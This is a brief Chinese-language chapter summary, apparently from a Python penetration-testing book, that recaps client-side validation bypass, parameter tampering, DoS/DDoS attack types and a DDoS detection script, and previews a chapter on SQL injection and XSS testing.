在本章中，我们学习了客户端验证以及如何绕过客户端验证。我们还了解了在哪些情况下客户端验证是一个不错的选择。我们已经学习了如何使用 Python 填写表单并发送参数，其中使用了 GET 方法。作为渗透测试人员，您应该知道参数篡改如何影响业务。本章介绍了四种 DoS 攻击类型。单个 IP 攻击属于 DoS 攻击类别，多个 IP 攻击属于 DDoS 攻击类别。这一部分不仅对渗透测试人员有帮助，对研究人员也有帮助。利用 Python DDoS 检测脚本，您可以修改代码并创建更大的代码，从而触发控制或减轻服务器上的 DDoS 攻击的操作。

在下一章中，您将学习 SQL 注入和**跨站脚本**攻击（**XSS**）。您将学习如何利用 Python 进行 SQL 注入测试。您还将学习如何使用 Python 脚本自动执行 XSS 攻击。
